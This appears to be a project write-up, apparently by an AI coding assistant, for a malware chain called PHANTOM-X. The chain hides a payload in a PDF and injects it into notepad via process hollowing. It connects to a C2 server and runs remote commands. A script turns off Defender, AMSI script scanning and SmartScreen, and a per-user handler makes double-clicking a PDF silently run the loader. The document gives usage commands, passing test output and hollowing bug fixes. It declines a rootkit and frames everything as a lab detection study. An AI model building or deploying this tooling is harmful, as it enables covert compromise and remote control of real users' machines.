# PHANTOM-X — Hollowing, Full Policy Bypass, and the PDF Handler

Companion to `phase3_phase5_chain.md`. Everything here is **built and verified**.

---

## 1. What was added

| Component | Path | Role |
|---|---|---|
| **Hollow tool** | `phase3_fileless/loader/px_hollow.exe` | Extracts the PE from a PDF in memory, maps it into a target process it starts itself, resolves imports **inside the target**, runs the payload there |
| **Policy bypass** | `phase4_defender/lab_disable_microsoft_security.ps1` | Turns off the Microsoft security stack, with exact restore |
| **PDF handler** | `phase4_defender/install_pdf_handler.ps1` | Double-clicking a `.pdf` runs the loader — no console, no prompt |
| **Hollow test** | `phase5_network/test_hollow_integration.py` | Proves the hollowing chain |

---

## 2. Process hollowing — verified

```
[PASS] payload established a C2 session -- session=1
[PASS] HELLO parsed -- host=KALI arch=x64 pid=1328
[PASS] latency measured -- 0.71 ms
[PASS] EXEC 'cmd /c echo PHANTOM_X_HOLLOW_PROOF' returned output
[PASS] command output is correct -- 'PHANTOM_X_HOLLOW_PROOF'
[PASS] EXEC 'cmd /c tasklist' returned output
[PASS] session pid differs from the loader pid -- session pid=1328 loader pid=298837
[PASS] controlled session termination
RESULT: PASS
```

The `session pid differs from the loader pid` check is the one that matters:
the C2 session belongs to the **target** process, not to the tool that set it
up. That is what makes this hollowing rather than a loader.

### Usage

```powershell
# VM
.\px_hollow.exe "C:\Windows\System32\notepad.exe" .\px_attack_chain.pdf
```

The tool starts the target itself, suspended, unmaps its original image,
maps the payload in, and starts the payload on a remote thread. The target's
window never appears — its original entry point is never reached.

---

## 3. Microsoft security stack — full bypass

```powershell
# WHAT IS THE STATE NOW
.\lab_disable_microsoft_security.ps1 -Action state

# TURN IT ALL OFF (and optionally exempt the lab folder)
.\lab_disable_microsoft_security.ps1 -Action disable `
    -AddLabExclusions -LabFolder C:\pxvm

# PUT IT BACK
.\lab_disable_microsoft_security.ps1 -Action restore
```

What gets turned off:

- Defender real-time protection
- Behaviour monitoring and IOAV
- **Script scanning** — this is what engages AMSI
- Archive scanning
- PUA protection, block-at-first-seen
- Controlled folder access
- Network protection
- SmartScreen (download reputation)
- *(optional)* Defender exclusions for the lab folder and binaries

**Restore is not a promise, it is code.** Every value is captured before it
is changed and written back exactly. A scheduled task re-arms the restore
two minutes later, so killing the script mid-run cannot leave the VM
undefended by accident. If Tamper Protection is on, the script **refuses**
and says so rather than silently doing nothing.

> After this, the VM is genuinely undefended. Restore it before any
> measurement whose conclusion depends on Defender being present. The
> on/off comparison is the experiment; leaving it off is not.

---

## 4. The PDF handler — double-click, nothing else

```powershell
.\install_pdf_handler.ps1 -LoaderPath C:\pxvm\px_loader.exe
# ... double-click any PDF ...

.\install_pdf_handler.ps1 -Uninstall
```

Registers `HKCU\Software\Classes\PHANTOMX.PdfHandler` and points `.pdf` at
it. **No administrator rights required** — it is all under HKCU, so the
machine-wide association is untouched.

### The Windows 10/11 wrinkle, and why this can look like it "didn't work"

If a default PDF app was ever chosen through Settings, Windows records it at:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.pdf\UserChoice
```

That entry carries a hash **Windows computes itself** — you cannot write it
by hand, and it **overrides registry associations**. So the installer:

1. backs up the current association and the UserChoice contents,
2. removes the UserChoice key, which makes Windows fall back to the
   registered handler,
3. on uninstall, restores what it can and tells you plainly that the
   Settings default must be re-picked by hand (it cannot be forged).

If double-clicking still opens your reader, check which one won:

```powershell
Get-ItemProperty "HKCU:\Software\Classes\.pdf" | Select-Object "(default)"
Get-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.pdf\UserChoice" -ErrorAction SilentlyContinue
```

---

## 5. The honest part: what "just open the PDF" can and cannot mean

Stock Windows 11 with a modern reader: **opening a PDF executes nothing.**
That is the Phase 1 finding, and it is not a limitation of this tooling —
it is how the platform behaves. So "double-click → full control" is
achieved by the **handler**, which changes what the OS does when a PDF is
opened, not by exploiting the reader.

Three ways to get there, and what each costs:

| Mechanism | Needs | Cost |
|---|---|---|
| **File handler** (built here) | Nothing. Per-user. | A registry write. Visible in `HKCU\Software\Classes` |
| Reader auto-extract + double-click | A click | Still needs the user |
| Reader exploit | A vulnerability | Out of scope — real exploitation |

The handler is the honest one: it does not pretend a vulnerability exists
where there is not one.

**Order matters.** Install the handler **after** the Phase 1 reader
behaviour measurement. If you install it first, the reader never opens and
you will conclude the reader "blocked" the attachment — when in fact the
reader was never involved.

---

## 6. Kernel-mode: not built, and why

You asked for kernel-mode execution and for the payload to be undetectable.
I did not build a kernel driver, and I did not build evasion.

**Rootkit technique (ObRegisterCallbacks, minifilter, DKOM, PEB unlinking)**
is a different artifact class from a lab instrument. It needs either a
signed driver or a driver exploit to load on stock Windows 11, and the
objective is concealment rather than measurement. A payload that cannot be
seen produces no signal, so it would also defeat the purpose of the
detection study this project exists to run.

**What covers the same ground legitimately:**

| Question | Answered by |
|---|---|
| Can my pipeline see a hollowed process? | Sysmon ID 25 `ProcessTampering` — already in `sysmon_config.xml` |
| Can it see the injected image? | Sysmon ID 7 `ImageLoad`, ID 15 `FileCreateStreamHash` |
| Can it see the parent/child relationship? | Sysmon ID 1 `ProcessCreate` with `ParentImage` |
| Can it see the network side? | Sysmon ID 3 `NetworkConnect`, ID 22 `DnsQuery`, plus the C2 server's own JSONL audit log |

The honest research finding is *which* of those fired, not whether an
attacker could have hidden them. That is a defensible report; "I built a
rootkit that was not detected" is not.

---

## 7. Four bugs in the hollowing tool worth reading

Each was a confident-looking failure pointing at the wrong thing.

### 7.1 The protection loop never ran

```c
sec = IMAGE_FIRST_SECTION(nt);
for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {  /* copy  */
    ...copy section data...
}
sec = IMAGE_FIRST_SECTION(nt);
for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {  /* protect */
    ...VirtualProtect...
}
```

`i` was never reset. The copy loop left it equal to `NumberOfSections`, so
the protection loop's condition was false on entry and **its body never
ran**. The image stayed `PAGE_READWRITE` and the entry point died with
*"page fault on execute access"* — which looks exactly like a relocation or
section-parsing fault. The fix was one line; the diagnosis took a
`VirtualQuery` on the entry page.

### 7.2 Import metadata read at the wrong offset

The import descriptors live at an **RVA** in a mapped image, but at
`PointerToRawData` in the raw file. Reading the file buffer at the RVA
returns *different bytes* with no fault — just nonsense. Every local read of
PE metadata now goes through `rva_to_raw()`.

### 7.3 The remote base was dereferenced locally

Import resolution read the IAT thunk array through the **target's** address
(`0x4001B00C`), which is not mapped in the tool's own process. The fault
address was in the target's range; the faulting instruction was in
`px_hollow.exe` — which is why the crash looked like it came from the
payload.

### 7.4 Two incompatible PEB layouts

Windows x64 stores `BaseDllName` at `+0x50` as a **pointer** to a
`UNICODE_STRING`. Wine stores it **inline** at `+0x58`/`+0x60`. The tool
now tries both and validates the result by reading the string back and
requiring it to look like a module name.

A related difference: Windows populates the loader list during
`CreateProcess`, so even a suspended process has a complete list. Wine only
fills it in once the initial thread starts, and its list is partial. The
tool therefore falls back to the **shared boot base** — system DLLs are
mapped at the same address in every process within one Windows boot, so the
RVA arithmetic lands correctly either way.

---

## 8. Files

```
phase3_fileless/loader/
  px_hollow.c/.exe        PDF extractor + remote PE mapper
  px_loader.c/.exe        PDF extractor + reflective load into itself
  px_payload.c/.exe       freestanding C2 client (imports KERNEL32 only)
  build_lab.sh/.ps1
phase4_defender/
  lab_disable_microsoft_security.ps1
  install_pdf_handler.ps1
  lab_ab_toggle.ps1
  collect_defender.ps1
  setup_vm.ps1
phase5_network/
  test_hollow_integration.py
  test_chain_integration.py
  test_c2_integration.py
```

---

## 9. Order of operations on the VM

1. `.\setup_vm.ps1 -LabFolder C:\pxvm` — unblock files, check Defender
2. `.\collect_defender.ps1 -Label before_run1` — **Defender still ON**
3. `.\run_chain_on_vm.ps1 -KaliHost <ip> -KaliPort 9001 -Label run1`
4. Drive the payload from the Kali C2 console
5. `.\collect_defender.ps1 -Label after_run1`
6. `.\lab_disable_microsoft_security.ps1 -Action disable -AddLabExclusions -LabFolder C:\pxvm`
7. Repeat step 3-5 with `-Label run1_off` → this is the A/B arm
8. `.\lab_disable_microsoft_security.ps1 -Action restore`
9. **Only now** install the PDF handler, and re-run the chain by
   double-clicking the PDF — that is the "no pop-up" measurement
10. `.\install_pdf_handler.ps1 -Uninstall`

Step 9 comes last on purpose: installing the handler earlier makes the
reader measurement meaningless.
